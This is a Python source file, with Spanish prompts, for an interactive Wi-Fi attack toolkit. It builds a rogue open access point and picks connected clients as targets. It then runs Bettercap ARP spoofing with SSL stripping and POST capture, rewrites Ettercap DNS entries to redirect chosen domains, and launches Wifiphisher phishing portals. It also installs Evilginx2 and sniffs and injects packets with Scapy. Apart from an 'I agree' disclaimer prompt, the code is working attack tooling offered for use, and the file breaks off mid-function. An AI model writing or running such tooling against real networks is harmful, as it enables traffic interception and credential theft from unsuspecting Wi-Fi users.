import os
import subprocess
import re
import time
import threading
import ipaddress
import sys
import shutil
import threading


def check_root():
    """Verifica si el script se ejecuta como root."""
    if os.geteuid() != 0:
        print("[-] Este script debe ejecutarse con privilegios de root. Por favor, ejecútelo con sudo o como root.")
        sys.exit(1)

def aceptar_codigo_conducta():
    """Muestra un descargo de responsabilidad y código de conducta, y requiere la aceptación del usuario."""
    conduct_text = """
    ====================================================================
            Código de Conducta y Descargo de Responsabilidad
    ====================================================================
    Esta herramienta se proporciona únicamente con fines de investigación y pruebas éticas.
    
    Usted se compromete a utilizar esta herramienta de manera responsable y solo en entornos autorizados.
    El uso de esta herramienta en redes o sistemas sin permiso expreso es ilegal y puede conllevar sanciones penales.
    
    El desarrollador no se hace responsable de cualquier daño, pérdida o consecuencia legal derivada del uso indebido de esta herramienta.
    
    Al continuar, usted confirma que:
       - Está autorizado para realizar pruebas en el entorno donde se utiliza esta herramienta.
       - Utilizará esta herramienta únicamente para fines éticos y de investigación.
    
    Escriba "I agree" para aceptar y continuar: """
    respuesta = input(conduct_text)
    if respuesta.strip().lower() != "i agree":
        print("[-] No se aceptó el código de conducta. Saliendo...")
        sys.exit(1)

# Llamamos a las funciones de comprobación antes de continuar con el resto del script.
check_root()
aceptar_codigo_conducta()



# Variables globales para notificaciones
notificaciones_thread = None
notificaciones_stop_event = None

# Variables globales
ap_interface_global = None
fake_ap_ssid_global = None  # Variable global para el ESSID del Fake AP

def crear_entorno_virtual():
    # Comprobar si el script ya se está ejecutando en un entorno virtual.
    if sys.prefix == sys.base_prefix:
        print("[+] No se detectó un entorno virtual. Creando 'venv'...")
        # Crear el entorno virtual si no existe.
        if not os.path.exists("venv"):
            subprocess.run([sys.executable, "-m", "venv", "--system-site-packages", "venv"], check=True)
        else:
            print("[+] El entorno virtual 'venv' ya existe.")
        # Reiniciar el script usando el intérprete del entorno virtual.
        venv_python = os.path.join("venv", "bin", "python")
        print("[+] Reiniciando el script en el entorno virtual...")
        os.execv(venv_python, [venv_python] + sys.argv)
    else:
        print("[+] Entorno virtual activo.")


def instalar_dependencias():
    print("[+] Actualizando lista de paquetes...")
    subprocess.run(["sudo", "apt", "update"], check=False)
    
    paquetes = {
        "aircrack-ng": "aircrack-ng",
        "hostapd": "hostapd",
        "dnsmasq": "dnsmasq",
        "bettercap": "bettercap",
        "wifiphisher": "wifiphisher",
        "tcpdump": "tcpdump",
        "gnome-terminal": "gnome-terminal",
        "scapy": "scapy",
    }
    
    for key, paquete in paquetes.items():
        result = subprocess.run(["dpkg", "-s", paquete], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[+] Instalando {paquete}...")
            install = subprocess.run(["sudo", "apt", "install", "-y", paquete], capture_output=True, text=True)
            if install.returncode != 0:
                print(f"[-] Error al instalar {paquete}:")
                print(install.stderr)
                
    # Actualizar dependencias Python para solucionar conflictos con bcrypt y passlib
    print("[+] Actualizando dependencias Python (bcrypt y passlib)...")
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=False)
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "bcrypt", "passlib"], check=False)
    
    # Instalar Evilginx2 si no está instalado
    instalar_evilginx2()          
                



def ejecutar_comando(comando):
    subprocess.run(comando, shell=True, check=False)

def listar_interfaces():
    resultado = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    interfaces = []
    for line in resultado.stdout.split('\n'):
        if "Interface" in line:
            interfaces.append(line.split()[1])
    return interfaces

def seleccionar_interfaz():
    interfaces = listar_interfaces()
    if not interfaces:
        print("[-] No se encontraron interfaces de red inalámbricas.")
        return None
    print("[+] Interfaces inalámbricas disponibles:")
    for idx, iface in enumerate(interfaces):
        print(f"[{idx + 1}] {iface}")
    seleccion = input("Seleccione la interfaz a utilizar (física, no la monitor): ")
    try:
        return interfaces[int(seleccion) - 1]
    except (IndexError, ValueError):
        print("[-] Selección inválida.")
        return None
        
def get_interface_ip(interface):
    try:
        result = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet ") and "inet6" not in line:
                # Se extrae la IP (sin la máscara)
                ip = line.split()[1].split("/")[0]
                return ip
        return None
    except Exception as e:
        print("Error obteniendo la IP de la interfaz:", e)
        return None
        

def seleccionar_interfaz_cable():
    print("[+] Listando interfaces cableadas disponibles...")
    try:
        result = subprocess.run("nmcli device status", shell=True, capture_output=True, text=True)
        lines = result.stdout.splitlines()
        ethernet_interfaces = []
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 4 and parts[1].lower() == "ethernet":
                ethernet_interfaces.append(parts[0])
        if not ethernet_interfaces:
            print("[-] No se encontraron interfaces cableadas.")
            return None
        print("[+] Interfaces cableadas disponibles:")
        for idx, iface in enumerate(ethernet_interfaces):
            print(f"[{idx + 1}] {iface}")
        seleccion = input("Seleccione la interfaz de salida (por cable): ")
        return ethernet_interfaces[int(seleccion) - 1]
    except Exception as e:
        print("Error al listar interfaces cableadas:", e)
        return None

def resetear_interfaz(interface):
    print(f"[+] Reiniciando la interfaz {interface} y eliminando procesos en conflicto...")
    ejecutar_comando("sudo systemctl stop wpa_supplicant")
    ejecutar_comando("sudo systemctl stop hostapd")
    ejecutar_comando("sudo systemctl stop dnsmasq")
    ejecutar_comando("sudo killall -9 wpa_supplicant hostapd dnsmasq")
    ejecutar_comando(f"sudo ip link set {interface} down")
    ejecutar_comando("sudo rfkill unblock all")

def habilitar_modo_ap(interface):
    print(f"[+] Configurando {interface} en modo AP...")
    ejecutar_comando(f"sudo ip link set {interface} down")
    ejecutar_comando(f"sudo iw dev {interface} set type __ap")
    ejecutar_comando(f"sudo ip link set {interface} up")
    return interface

def configurar_dnsmasq(interface, dhcp_range, lease_time):
    dnsmasq_config = f"""
interface={interface}
dhcp-range={dhcp_range},{lease_time}
dhcp-option=option:router,192.168.1.1
dhcp-option=option:dns-server,8.8.8.8,8.8.4.4
log-queries
log-dhcp
"""
    with open("/etc/dnsmasq.conf", "w") as file:
        file.write(dnsmasq_config)
    ejecutar_comando("sudo systemctl restart dnsmasq")

def configurar_red(interface):
    ejecutar_comando(f"sudo ip link set {interface} down")
    ejecutar_comando(f"sudo ip addr flush dev {interface}")
    ejecutar_comando(f"sudo ip addr add 192.168.1.1/24 dev {interface}")
    ejecutar_comando(f"sudo ip link set {interface} up")

def iniciar_hostapd():
    print("[+] Desenmascarando hostapd...")
    ejecutar_comando("sudo systemctl unmask hostapd")
    print("[+] Iniciando hostapd...")
    ejecutar_comando("sudo systemctl restart hostapd")

def habilitar_nat():
    print("[+] Habilitando NAT para proporcionar acceso a Internet a los clientes conectados...")
    ejecutar_comando("sudo sysctl -w net.ipv4.ip_forward=1")
    external_interface = seleccionar_interfaz_cable()
    if not external_interface:
        print("[-] No se ha seleccionado una interfaz cableada. NAT no se configurará.")
    else:
        ejecutar_comando("sudo iptables -t nat -F")
        ejecutar_comando(f"sudo iptables -t nat -A POSTROUTING -o {external_interface} -j MASQUERADE")
        print(f"[+] NAT habilitado usando la interfaz {external_interface}.")

def setup_fake_ap():
    global ap_interface_global, fake_ap_ssid_global
    ssid = input("Ingrese el nombre del Fake AP: ") or "Free_WiFi"
    fake_ap_ssid_global = ssid
    channel = input("Ingrese el canal (default 6): ") or "6"
    interface = seleccionar_interfaz()
    if not interface:
        return
    resetear_interfaz(interface)
    ejecutar_comando(f"sudo nmcli device set {interface} managed no")
    ap_interface = habilitar_modo_ap(interface)
    ap_interface_global = ap_interface
    print(f"[+] Configurando Fake Access Point en {ap_interface}...")
    hostapd_config_path = "/etc/hostapd/hostapd.conf"
    with open(hostapd_config_path, "w") as f:
        f.write(f"""
interface={ap_interface}
driver=nl80211
ctrl_interface=/var/run/hostapd
ssid={ssid}
hw_mode=g
country_code=US
ieee80211d=1
ieee80211n=1
ignore_broadcast_ssid=0
channel={channel}
auth_algs=1
wpa=0
""".strip())
    configurar_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
    configurar_red(ap_interface)
    iniciar_hostapd()
    habilitar_nat()

def recuperar_interfaz(interface):
    print(f"[+] Recuperando la interfaz {interface} a modo Managed...")
    ejecutar_comando(f"sudo nmcli device set {interface} managed yes")
    ejecutar_comando(f"sudo ip link set {interface} down")
    ejecutar_comando(f"sudo iw dev {interface} set type managed")
    ejecutar_comando(f"sudo ip link set {interface} up")
    print("[+] Interfaz recuperada a modo Managed.")

def get_dhcp_leases():
    leases = {}
    try:
        with open("/var/lib/misc/dnsmasq.leases", "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 3:
                    timestamp, mac, ip = parts[0], parts[1], parts[2]
                    hostname = parts[3] if len(parts) >= 4 else ""
                    leases[mac.lower()] = {"IP": ip, "hostname": hostname}
    except Exception as e:
        print("Error al leer las leases de dnsmasq:", e)
    return leases
    
    
def menu_configuracion_red():
    while True:
        print("""
[CONFIGURACIÓN DE RED]
  1) Configurar Fake AP (Personalizar)
  2) Automatizar Configuracion (Por defecto)
  3) Volver al Menú Principal
        """)
        opcion = input("Seleccione una opción: ").strip()
        if opcion == "1":
            setup_fake_ap()
        elif opcion == "2":
            automatizar_configuracion_red()
        elif opcion == "3":
            break
        else:
            print("[-] Opción inválida, intente de nuevo.\n")    

def get_connected_stations():
    try:
        output = subprocess.check_output("sudo hostapd_cli all_sta", shell=True, text=True)
    except Exception as e:
        print("Error al ejecutar hostapd_cli:", e)
        return []
    stations = []
    current_station = None
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("Selected interface"):
            continue
        if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", line):
            if current_station is not None:
                stations.append(current_station)
            current_station = {"MAC": line}
        elif "=" in line and current_station is not None:
            key, value = line.split("=", 1)
            current_station[key.strip()] = value.strip()
    if current_station is not None:
        stations.append(current_station)
    leases = get_dhcp_leases()
    for station in stations:
        mac = station.get("MAC", "").lower()
        if mac in leases:
            station.update(leases[mac])
    return stations

def monitorear_clientes():
    print("Monitoreo de clientes conectados (hostapd). Presiona ENTER para detener.")
    stop_event = threading.Event()
    previous_stations = []
    def monitor():
        nonlocal previous_stations
        while not stop_event.is_set():
            current_stations = get_connected_stations()
            if current_stations != previous_stations:
                os.system("clear")
                print("----- Clientes Conectados (hostapd) -----")
                if current_stations:
                    for station in current_stations:
                        mac = station.get("MAC", "N/A")
                        ip = station.get("IP", "N/A")
                        hostname = station.get("hostname", "N/A")
                        print(f"MAC: {mac} | IP: {ip} | Hostname: {hostname}")
                else:
                    print("No hay clientes conectados.")
                previous_stations = current_stations
            time.sleep(5)
    t = threading.Thread(target=monitor, daemon=True)
    t.start()
    input("Presiona ENTER para detener el monitoreo...")
    stop_event.set()
    t.join(timeout=1)
    print("Monitoreo detenido.")

def start_mitm_attack():
    objetivo = seleccionar_objetivo()
    if not objetivo:
        print("[-] No se pudo seleccionar un objetivo.")
        return
    target_ip = objetivo.get("IP")
    if not target_ip:
        print("[-] No se encontró una IP para el objetivo seleccionado.")
        return
    iface = input("Ingrese la interfaz para el ataque MITM (dejar en blanco para usar la interfaz AP): ").strip()
    if iface == "" and ap_interface_global is not None:
        iface = ap_interface_global
    if not iface:
        print("[-] No se ha seleccionado una interfaz para MITM.")
        return
    print(f"Iniciando ataque MITM en la interfaz {iface} contra el objetivo {target_ip} con Bettercap...")
    log_path = "/home/kali/Desktop/bettercap_log.txt"
    print("Se abrirá una nueva ventana de terminal con Bettercap en modo interactivo.")
    print("Dentro de esa ventana podrás usar comandos como:")
    print("  - help     : ver la lista de comandos")
    print("  - net.show : mostrar dispositivos conectados")
    print("  - arp.show : mostrar la tabla ARP")
    print("  - exit     : salir de Bettercap")
    print("Cuando termines, cierra la ventana o presiona ENTER aquí para volver al menú principal.")
    try:
        cmd = (
            f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo bettercap -iface {iface} "
            f"-eval \"set log.output.file {log_path}; set arp.spoof.targets {target_ip}; set arp.spoof.fullduplex true; arp.spoof on; "
            f"net.probe on; net.recon on; set net.sniff.filter \\\"tcp port 80\\\"; set net.sniff.verbose true; "
            f"set net.sniff.output /home/kali/Desktop/bettercap_capture.pcap; net.sniff on; "
            f"set http.proxy.sslstrip true; set http.proxy.parse_post true; http.proxy on; "
            f"events.stream off; events.stream on\"; exec bash'"
       )
        proc = subprocess.Popen(cmd, shell=True)
        input("Presiona ENTER para volver al menú principal...")
        proc.terminate()
        proc.wait(timeout=5)
        print("Ataque MITM detenido. Revisa el log en:", log_path)
    except Exception as e:
        print("Error al iniciar Bettercap en una nueva ventana:", e)

def seleccionar_objetivo():
    stations = get_connected_stations()
    if not stations:
        print("[-] No se encontraron dispositivos conectados.")
        return None
    print("Dispositivos conectados:")
    for i, station in enumerate(stations):
        ip = station.get("IP", "N/A")
        mac = station.get("MAC", "N/A")
        hostname = station.get("hostname", "N/A")
        print(f"[{i + 1}] IP: {ip} | MAC: {mac} | Hostname: {hostname}")
    seleccion = input("Seleccione el número del dispositivo a atacar: ")
    try:
        index = int(seleccion) - 1
        if index < 0 or index >= len(stations):
            print("[-] Selección inválida.")
            return None
        return stations[index]
    except Exception as e:
        print("Error al seleccionar el objetivo:", e)
        return None

def crear_caplet_dns_spoof(target_ip):
    # Crea un caplet temporal con los comandos para DNS spoofing.
    caplet_path = "/tmp/ettercap_dns.cap"
    contenido = (
        f'set log.output.file /home/kali/Desktop/ettercap_log.txt;\n'
        f'set arp.spoof.targets "//{target_ip}//";\n'
        'set arp.spoof.fullduplex true;\n'
        'arp.spoof on;\n'
        'net.probe on;\n'
        'net.recon on;\n'
        'set net.sniff.filter "tcp port 80";\n'
        'set net.sniff.verbose true;\n'
        'set http.proxy.sslstrip true;\n'
        'set http.proxy.parse_post true;\n'
        'http.proxy on;\n'
    )
    try:
        with open(caplet_path, "w") as f:
            f.write(contenido)
        print(f"[+] Caplet para DNS Spoofing creado en: {caplet_path}")
    except Exception as e:
        print("Error al crear el caplet:", e)
    return caplet_path

def get_default_gateway():
    try:
        output = subprocess.check_output("ip route | grep default", shell=True, text=True)
        parts = output.split()
        if len(parts) >= 3:
            return parts[2]
        else:
            return None
    except Exception as e:
        print("Error al obtener la IP del gateway:", e)
        return None
        
import re
import subprocess

def configurar_ettercap_conf():
    config_path = "/etc/ettercap/etter.conf"
    backup_path = "/etc/ettercap/etter.conf.bak"
    
    try:
        # Hacer copia de seguridad
        subprocess.run(f"sudo cp {config_path} {backup_path}", shell=True, check=True)
        print("[+] Copia de seguridad de etter.conf creada en:", backup_path)
        
        # Leer el archivo original
        with open(config_path, "r") as f:
            lines = f.readlines()
        
        new_lines = []
        for line in lines:
            stripped = line.lstrip()
            # Si la línea está comentada, no se modifica
            if stripped.startswith("#"):
                new_lines.append(line)
            elif stripped.startswith("redir_command_on"):
                new_lines.append('redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-ports 8080";\n')
            elif stripped.startswith("redir_command_off"):
                new_lines.append('redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-ports 8080";\n')
            elif stripped.startswith("ec_uid"):
                # Reemplazar el número (p.ej. 65534) por 0, preservando el comentario
                new_line = re.sub(r'^(ec_uid\s*=\s*)\d+', r'\1 0', line)
                new_lines.append(new_line)
            elif stripped.startswith("ec_gid"):
                new_line = re.sub(r'^(ec_gid\s*=\s*)\d+', r'\1 0', line)
                new_lines.append(new_line)
            else:
                new_lines.append(line)
        
        # Escribir en un archivo temporal y luego moverlo
        with open("/tmp/etter.conf", "w") as f:
            f.writelines(new_lines)
        
        subprocess.run(f"sudo mv /tmp/etter.conf {config_path}", shell=True, check=True)
        print("[+] etter.conf actualizado correctamente.")
    except Exception as e:
        print("Error al actualizar etter.conf:", e)



        

def set_iptables_legacy():
    try:
        subprocess.run("sudo update-alternatives --set iptables /usr/sbin/iptables-legacy", shell=True, check=True)
        subprocess.run("sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy", shell=True, check=True)
        # Vaciar las reglas de nftables (si existen)
        subprocess.run("sudo nft flush ruleset", shell=True, check=True)
        print("[+] Iptables configurado a legacy y nftables flushed.")
    except Exception as e:
        print("Error configurando iptables a legacy:", e)

def restore_iptables_nft():
    try:
        subprocess.run("sudo update-alternatives --set iptables /usr/sbin/iptables-nft", shell=True, check=True)
        subprocess.run("sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-nft", shell=True, check=True)
        # Opcional: recargar o reiniciar el servicio nftables si es necesario
        subprocess.run("sudo systemctl restart nftables", shell=True, check=True)
        print("[+] Iptables restaurado a nft.")
    except Exception as e:
        print("Error restaurando iptables a nft:", e)
        
        

def configurar_etter_dns(dominio, ip_destino):
    dns_file = "/etc/ettercap/etter.dns"
    backup_file = "/etc/ettercap/etter.dns.bak"
    try:
        # Realizar copia de seguridad
        subprocess.run(f"sudo cp {dns_file} {backup_file}", shell=True, check=True)
        print("[+] Copia de seguridad de etter.dns creada en:", backup_file)
        
        # Leer el archivo línea por línea
        with open(dns_file, "r") as f:
            lines = f.readlines()
        
        nueva_regla = f"{dominio} A {ip_destino}\n"
        regla_existente = False
        new_lines = []
        for line in lines:
            # Comprobamos si la línea, al quitar espacios, empieza exactamente con el dominio seguido de un espacio
            if line.lstrip().startswith(dominio + " "):
                new_lines.append(nueva_regla)
                regla_existente = True
            else:
                new_lines.append(line)
        
        # Si no se encontró una regla existente, se añade al final
        if not regla_existente:
            new_lines.append(nueva_regla)
        
        # Escribir el contenido actualizado en un archivo temporal y moverlo al archivo original
        with open("/tmp/etter.dns", "w") as f:
            f.writelines(new_lines)
        subprocess.run(f"sudo mv /tmp/etter.dns {dns_file}", shell=True, check=True)
        print(f"[+] Regla para {dominio} actualizada correctamente en etter.dns.")
    except Exception as e:
        print("Error al actualizar etter.dns:", e)

        

def solicitar_redirecciones():
    """
    Solicita al usuario múltiples redirecciones y las valida.
    Devuelve una lista de tuplas (dominio, ip_destino).
    """
    redirecciones = []
    while True:
        dominio = input("Ingrese el dominio a redirigir (o dejar en blanco para terminar): ").strip()
        if dominio == "":
            break
        # Validar el formato del dominio (acepta tanto "google.com" como "*.google.com")
        if not re.match(r'^(?:\*\.)?[\w.-]+\.[a-zA-Z]{2,}$', dominio):
            print("[-] El formato del dominio ingresado no es correcto.")
            continue

        ip_destino = input(f"Ingrese la IP destino para {dominio} (por ejemplo, 87.240.183.90): ").strip()
        # Validar que la IP sea correcta
        try:
            ipaddress.ip_address(ip_destino)
        except ValueError:
            print("[-] La IP ingresada no es válida.")
            continue

        redirecciones.append((dominio, ip_destino))
    return redirecciones

        
        

def start_dns_spoof_attack():
    iface = input("Ingrese la interfaz para el ataque DNS Spoofing (dejar en blanco para usar la interfaz AP): ").strip()
    if iface == "" and ap_interface_global is not None:
        iface = ap_interface_global
    if not iface:
        print("[-] No se ha seleccionado una interfaz para DNS Spoofing.")
        return

    objetivo = seleccionar_objetivo()
    if not objetivo:
        print("[-] No se encontró un objetivo para DNS Spoofing.")
        return
    target_ip = objetivo.get("IP")
    if not target_ip:
        print("[-] No se encontró la IP del objetivo.")
        return

    gateway_ip = get_default_gateway()
    if not gateway_ip:
        print("[-] No se pudo obtener la IP del gateway.")
        return
    
    
    
    # Antes de iniciar el ataque DNS Spoofing, redirige google.com a yandex.com
    # Solicitar múltiples redirecciones al usuario
    redirecciones = solicitar_redirecciones()
    if not redirecciones:
        print("[-] No se ingresaron redirecciones.")
        return


   # Para cada par ingresado, actualizamos el archivo etter.dns
    for dominio, ip_destino in redirecciones:
        configurar_etter_dns(dominio, ip_destino)


    # Cambiar a iptables-legacy antes de iniciar Ettercap
    set_iptables_legacy()    
    
    # Edita automáticamente etter.conf para asegurar la redirección SSL
    configurar_ettercap_conf()    

    print(f"Iniciando ataque DNS Spoofing en la interfaz {iface} contra el objetivo {target_ip} con gateway {gateway_ip} usando Ettercap (modo GUI)...")
    print("Se abrirá una nueva ventana de terminal con Ettercap en modo gráfico (GTK).")
    print("Cuando termines, cierra la ventana o presiona ENTER aquí para volver al menú principal.")
    
    try:
        # Creamos el caplet con los comandos necesarios
        caplet_file = crear_caplet_dns_spoof(target_ip)
        # Lanzamos Ettercap en modo gráfico (-G), con el plugin de DNS spoof (-P dns_spoof)
        # y con MITM remoto (-M arp:remote) usando la sintaxis TARGET con campos vacíos.
        cmd = (
            f"gnome-terminal -- bash -c 'sudo ettercap -G -S -i {iface} -P dns_spoof -M arp:remote \"//{target_ip}//\" \"//{gateway_ip}//\" -caplet {caplet_file}; exec bash'"
        )
        proc = subprocess.Popen(cmd, shell=True)
        input("Presiona ENTER para volver al menú principal...")
        proc.terminate()
        proc.wait(timeout=5)
        print("Ataque DNS Spoofing detenido.")
    except Exception as e:
        print("Error al iniciar Ettercap para DNS Spoofing:", e)
    finally:
        # Restaurar la configuración de iptables a nft
        restore_iptables_nft()
            

def start_phishing_portal():
    iface = input("Ingrese la interfaz para el portal de phishing (dejar en blanco para usar la interfaz AP): ").strip()
    if iface == "" and ap_interface_global is not None:
        iface = ap_interface_global
    if not iface:
        print("[-] No se ha seleccionado una interfaz para el portal de phishing.")
        return
    print("Seleccione el modo de ataque para Wifiphisher:")
    print("  1) Atacar únicamente el AP Fake")
    print("  2) Escanear todas las redes disponibles")
    modo = input("Ingrese 1 o 2: ").strip()
    if modo == "1":
        if fake_ap_ssid_global:
            essid_fake = fake_ap_ssid_global
            print(f"Se utilizará el ESSID del Fake AP: {essid_fake}")
        else:
            print("[-] No se encontró un ESSID para el Fake AP. Por favor, cree el AP primero.")
            return
    else:
        essid_fake = ""
    print(f"Iniciando Portal de Phishing con Wifiphisher en la interfaz {iface}...")
    print("Se abrirá una nueva ventana de terminal con Wifiphisher en modo interactivo.")
    print("En esa ventana podrás seleccionar el escenario de phishing deseado.")
    print("Cuando termines, cierra la ventana o presiona ENTER aquí para volver al menú principal.")
    try:
        if modo == "1":
            cmd = f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo wifiphisher -i {iface} -e \"{essid_fake}\" -kN; exec bash'"
        else:
            cmd = f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo wifiphisher -i {iface} -kN; exec bash'"
        proc = subprocess.Popen(cmd, shell=True)
        input("Presiona ENTER para volver al menú principal...")
        proc.terminate()
        proc.wait(timeout=5)
        print("Portal de Phishing detenido.")
    except Exception as e:
        print("Error al iniciar Wifiphisher:", e)
        
        
def sniffing_menu():
    while True:
        print("""
[ANÁLISIS E INYECCIÓN]
  1) Captura pasiva (Wireshark)
  2) Captura y Análisis Avanzado (Scapy)
  3) Inyectar Paquete ICMP (Scapy)
  4) Manipular Paquetes (Scapy)
  5) Volver al menú principal
        """)
        opcion = input("Seleccione una opción: ").strip()
        if opcion == "1":
            start_sniffing_traffic()
        elif opcion == "2":
            scapy_analisis_avanzado()
        elif opcion == "3":
            inyectar_paquete_icmp()
        elif opcion == "4":
            manipular_paquete_tcp()
        elif opcion == "5":
            break
        else:
            print("[-] Opción inválida, intente de nuevo.\n")        

def start_sniffing_traffic():
    iface = input("Ingrese la interfaz para sniffing de tráfico: ").strip()
    if not iface:
        print("[-] No se ha seleccionado una interfaz.")
        return
    log_path = "/home/kali/Desktop/tcpdump_capture.pcap"
    print(f"[+] Iniciando tcpdump en la interfaz {iface}. La captura se guardará en {log_path}.")
    cmd = f"gnome-terminal -- bash -c 'sudo tcpdump -i {iface} -w {log_path}; exec bash'"
    try:
        proc = subprocess.Popen(cmd, shell=True)
        input("Presiona ENTER para detener el sniffing...")
        proc.terminate()
        proc.wait(timeout=5)
        print("[+] Sniffing detenido.")
    except Exception as e:
        print("[-] Error al iniciar tcpdump:", e)
        
def get_interface_ips(interface):
    import subprocess
    ips = []
    try:
        result = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet ") and "inet6" not in line:
                # Extrae la IP (sin la máscara)
                ip = line.split()[1].split("/")[0]
                ips.append(ip)
    except Exception as e:
        print("Error obteniendo IPs de la interfaz:", e)
    return ips


def scapy_analisis_avanzado():
    try:
        from scapy.all import sniff, wrpcap, get_if_list
    except ImportError:
        print("[-] Scapy no está instalado. Intente instalarlo con: pip install scapy")
        return
    
    import sys, subprocess

    # Obtener la lista de interfaces disponibles
    interfaces = get_if_list()
    if not interfaces:
        print("[-] No se encontraron interfaces disponibles.")
        return
    
    print("[+] Interfaces disponibles:")
    for idx, iface in enumerate(interfaces, start=1):
        print(f"  [{idx}] {iface}")
    
    try:
        choice = int(input("Seleccione la interfaz por número: ").strip())
        iface = interfaces[choice - 1]
    except Exception as e:
        print("[-] Selección inválida.", e)
        return

    # Función auxiliar para obtener IPs de la interfaz
    def get_interface_ips(interface):
        ips = []
        try:
            result = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("inet ") and "inet6" not in line:
                    ip = line.split()[1].split("/")[0]
                    ips.append(ip)
        except Exception as e:
            print("Error obteniendo IPs de la interfaz:", e)
        return ips

    ips = get_interface_ips(iface)
    if not ips:
        print("[-] No se encontraron IPs asignadas en la interfaz seleccionada.")
    elif len(ips) == 1:
        chosen_ip = ips[0]
        print(f"[+] La única IP asignada a {iface} es: {chosen_ip}")
    else:
        print("[+] IPs asignadas en la interfaz:")
        for idx, ip in enumerate(ips, start=1):
            print(f"  [{idx}] {ip}")
        try:
            ip_choice = int(input("Seleccione el número de la IP a utilizar: ").strip())
            chosen_ip = ips[ip_choice - 1]
        except Exception as e:
            print("[-] Selección inválida, se utilizará la primera IP:", ips[0])
            chosen_ip = ips[0]
        print(f"[+] Se seleccionó la IP: {chosen_ip}")
    
    filter_expr = input("Ingrese un filtro BPF (opcional, ej: tcp port 80): ").strip()
    timeout_str = input("Ingrese el tiempo de captura en segundos (por defecto 30): ").strip()
    try:
        timeout = int(timeout_str) if timeout_str else 30
    except ValueError:
        print("[-] Tiempo no válido, usando 30 segundos.")
        timeout = 30

    advanced_choice = input("¿Activar modo avanzado (detalle en log) en tiempo real? (s/n): ").strip().lower()
    advanced_mode = True if advanced_choice == "s" else False

    print(f"[+] Capturando paquetes en {iface} por {timeout} segundos...")

    if advanced_mode:
        log_file = input("Ingrese el nombre del archivo de log (por defecto scapy_advanced.log): ").strip()
        if not log_file:
            log_file = "scapy_advanced.log"
        open(log_file, "w").close()  # Limpiar el log
        packet_counter = 0
        def procesar_paquete(pkt):
            nonlocal packet_counter
            packet_counter += 1
            with open(log_file, "a") as f:
                f.write(pkt.show(dump=True) + "\n")
            # Actualizar la misma línea cada 50 paquetes sin llenar el terminal
            if packet_counter % 50 == 0:
                sys.stdout.write(f"\r[+] {packet_counter} paquetes capturados...")
                sys.stdout.flush()
        packets = sniff(iface=iface, filter=filter_expr, timeout=timeout, prn=procesar_paquete)
        print("")
        print(f"[+] Captura finalizada. Se capturaron {len(packets)} paquetes.")
        print(f"[+] Detalles completos guardados en {log_file}.")
    else:
        packets = sniff(iface=iface, filter=filter_expr, timeout=timeout)
        print(f"[+] Captura finalizada. Se capturaron {len(packets)} paquetes.")
        print("\n[+] Resumen de los primeros 5 paquetes:")
        for i, pkt in enumerate(packets[:5], start=1):
            print(f"--- Paquete {i} ---")
            print(pkt.summary())
            print("-" * 40)

    save_choice = input("¿Desea guardar la captura en un archivo pcap? (s/n): ").strip().lower()
    if save_choice == "s":
        filename = input("Ingrese el nombre del archivo (sin extensión, por defecto scapy_capture): ").strip()
        if not filename:
            filename = "scapy_capture"
        filename += ".pcap"
        wrpcap(filename, packets)
        print(f"[+] Captura guardada en {filename}.")

# Ejemplo de función interactiva de inyección de paquetes con Scapy:
def inyectar_paquete_icmp():
    try:
        from scapy.all import IP, ICMP, send
    except ImportError:
        print("[-] Scapy no está instalado. Intente instalarlo con: pip install scapy")
        return
    target_ip = input("Ingrese la IP de destino para el paquete ICMP: ").strip()
    payload = input("Ingrese un mensaje de payload (opcional): ")
    packet = IP(dst=target_ip) / ICMP() / payload
    send(packet)
    print(f"[+] Paquete ICMP enviado a {target_ip}")


def manipular_paquete_tcp():
    try:
        from scapy.all import sniff, send, get_if_list, IP, TCP, Raw, Ether
    except ImportError:
        print("[-] Scapy no está instalado. Instale Scapy con: pip install scapy")
        return

    import subprocess, sys

    # Mostrar algunos filtros BPF comunes (esto es solo informativo)
    print("[+] Información: Algunos filtros BPF comunes son:")
    print("    - 'tcp'  (capturar solo tráfico TCP)")
    print("    - 'udp'  (capturar solo tráfico UDP)")
    print("    - 'icmp' (capturar solo tráfico ICMP)")
    print("    - 'tcp port 80' (capturar tráfico HTTP)")
    print("    - 'host 192.168.1.75' (capturar tráfico de/para una IP específica)")
    print("    Puedes combinarlos usando operadores lógicos (and, or).\n")
    
    # 1. Seleccionar la interfaz para capturar el paquete
    interfaces = get_if_list()
    if not interfaces:
        print("[-] No se encontraron interfaces disponibles.")
        return

    print("[+] Interfaces disponibles:")
    for idx, iface in enumerate(interfaces, start=1):
        print(f"  [{idx}] {iface}")
    try:
        choice = int(input("Seleccione la interfaz para capturar un paquete: ").strip())
        iface = interfaces[choice - 1]
    except Exception as e:
        print("[-] Selección inválida.", e)
        return

    # 2. (Opcional) Permitir filtrar la captura por una IP de referencia
    extra_filter = ""
    use_ip_filter = input("¿Desea agregar un filtro para una IP de referencia? (s/n): ").strip().lower()
    if use_ip_filter == "s":
        ref_ip = input("Ingrese la IP a filtrar (ej: la IP del dispositivo víctima): ").strip()
        if ref_ip:
            extra_filter = f"host {ref_ip}"
    
    filter_expr = input("Ingrese un filtro BPF (opcional, ej: tcp port 80): ").strip()
    # Combinar filtros si se ingresó alguno extra
